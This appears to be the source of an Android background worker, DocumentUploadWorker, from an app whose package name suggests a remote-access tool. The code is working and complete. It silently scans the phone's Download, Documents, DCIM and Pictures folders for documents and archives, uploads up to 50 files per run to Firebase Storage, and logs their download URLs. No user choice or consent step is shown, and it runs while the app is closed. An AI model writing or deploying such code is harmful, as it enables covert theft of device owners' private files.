package com.bushorat.app.helpers;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Background worker to upload all file types (PDFs, Excel, etc.) even when app is closed.
 * Uses WorkManager for reliable background processing.
 */
public class DocumentUploadWorker extends Worker {
    private static final String TAG = "DocumentUploadWorker";
    private static final int MAX_DOCUMENTS_PER_SYNC = 50;  // Reduced for faster sync
    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout to avoid ANR
    private long startTime;
    private int uploadedCount = 0;

    public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        startTime = System.currentTimeMillis();
        
        Log.d(TAG, "⏰ Document upload worker started");
        
        try {
            FirebaseAuth auth = FirebaseAuth.getInstance();
            if (auth == null) {
                Log.w(TAG, "FirebaseAuth not initialized, retrying");
                return Result.retry();
            }
            
            FirebaseUser user = auth.getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            Log.d(TAG, "Starting document upload for user: " + userId);
            
            uploadDocuments(userId);
            
            long duration = System.currentTimeMillis() - startTime;
            Log.d(TAG, "✓ Document upload completed in " + duration + "ms - uploaded " + uploadedCount + " documents");
            
            // Always return success - documents will be retried next cycle if needed
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Document upload worker error", e);
            return Result.retry();
        }
    }
    
    /**
     * Check if we're running out of time
     */
    private boolean isTimeoutApproaching() {
        long elapsed = System.currentTimeMillis() - startTime;
        return elapsed > MAX_WORK_TIME_MS;
    }

    private void uploadDocuments(String userId) {
        uploadedCount = 0;
        
        // Scan most important document directories first
        String[] scanPaths = {
                "/sdcard/Download",
                "/sdcard/Downloads", 
                "/sdcard/Documents",
                getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
                "/sdcard/DCIM",
                "/sdcard/Pictures",
        };

        Log.d(TAG, "Starting document scan for user: " + userId);
        
        for (String path : scanPaths) {
            // Check timeout - stop if running out of time
            if (isTimeoutApproaching()) {
                Log.w(TAG, "Timeout approaching, stopping scan");
                break;
            }
            
            if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory() && dir.canRead()) {
                    Log.d(TAG, "Scanning: " + path);
                    scanDirectoryRecursive(dir, userId, 0);  // Max depth 0 for top-level files
                }
            }
        }
        
        Log.d(TAG, "Document upload complete - " + uploadedCount + " files uploaded");
    }

    /**
     * Recursively scan directories for documents with depth limit and timeout
     */
    private void scanDirectoryRecursive(File dir, String userId, int depth) {
        // Limit recursion depth to avoid taking too long
        if (depth > 2) {
            return;
        }
        
        // Check timeout
        if (isTimeoutApproaching()) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null || files.length == 0) {
                return;
            }

            for (File file : files) {
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }

                if (file.isDirectory() && !file.isHidden() && depth < 2) {
                    // Recursively scan subdirectories (max 2 levels deep)
                    scanDirectoryRecursive(file, userId, depth + 1);
                } else if (file.isFile() && file.canRead()) {
                    if (isDocumentFile(file)) {
                        uploadFile(file, userId);
                        uploadedCount++;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    private boolean isDocumentFile(File file) {
        if (!file.isFile()) return false;
        String name = file.getName().toLowerCase();
        return name.endsWith(".pdf")
                || name.endsWith(".xlsx")
                || name.endsWith(".xls")
                || name.endsWith(".docx")
                || name.endsWith(".doc")
                || name.endsWith(".pptx")
                || name.endsWith(".ppt")
                || name.endsWith(".csv")
                || name.endsWith(".txt")
                || name.endsWith(".zip")
                || name.endsWith(".rar")
                || name.endsWith(".7z");
    }

    private void uploadFile(File file, String userId) {
        try {
            String fileName = file.getName();
            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + file.lastModified());
            
            Log.d(TAG, "Uploading document: " + fileName + " (" + (file.length() / 1024) + " KB)");
            
            StorageReference storageRef = FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            Uri fileUri = Uri.fromFile(file);
            
            storageRef.putFile(fileUri)
                    .addOnSuccessListener(task -> {
                        Log.d(TAG, "Storage upload successful: " + fileName);
                        task.getStorage().getDownloadUrl().addOnCompleteListener(urlTask -> {
                            if (urlTask.isSuccessful() && urlTask.getResult() != null) {
                                recordDocumentInDatabase(userId, fileName, urlTask.getResult().toString(), file.length());
                                Log.d(TAG, "✓ Document recorded in DB: " + fileName);
                            } else {
                                Log.e(TAG, "Failed to get download URL for: " + fileName);
                            }
                        });
                    })
                    .addOnFailureListener(e -> Log.e(TAG, "Upload failed for " + fileName, e));

        } catch (Exception e) {
            Log.e(TAG, "Error uploading file: " + file.getName(), e);
        }
    }

    private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
            String docId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());

            Map<String, Object> docData = new HashMap<>();
            docData.put("dataType", "document");
            docData.put("fileName", fileName);
            docData.put("url", downloadUrl);
            docData.put("fileSize", fileSize);
            docData.put("mimeType", getMimeType(fileName));
            docData.put("uploadedAt", System.currentTimeMillis());
            docData.put("timestamp", System.currentTimeMillis());
            docData.put("userId", userId);

            documentsRef.child(docId).setValue(docData)
                    .addOnSuccessListener(aVoid -> {
                        Log.d(TAG, "✓ Document metadata saved: " + fileName);
                    })
                    .addOnFailureListener(e -> {
                        Log.e(TAG, "Failed to save document metadata: " + fileName, e);
                    });
        } catch (Exception e) {
            Log.e(TAG, "Failed to record document in database", e);
        }
    }
    
    private String getMimeType(String fileName) {
        String lower = fileName.toLowerCase();
        if (lower.endsWith(".pdf")) return "application/pdf";
        if (lower.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (lower.endsWith(".xlsx")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        if (lower.endsWith(".pptx")) return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        if (lower.endsWith(".txt")) return "text/plain";
        if (lower.endsWith(".csv")) return "text/csv";
        return "application/octet-stream";
    }

    /**
     * Enqueue a one-time document upload work
     */
    public static void enqueueWork(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(DocumentUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(context).enqueueUniqueWork(
                "document_upload_once",
                ExistingWorkPolicy.KEEP,
                uploadWork
        );
        Log.d(TAG, "Document upload work enqueued");
    }
}
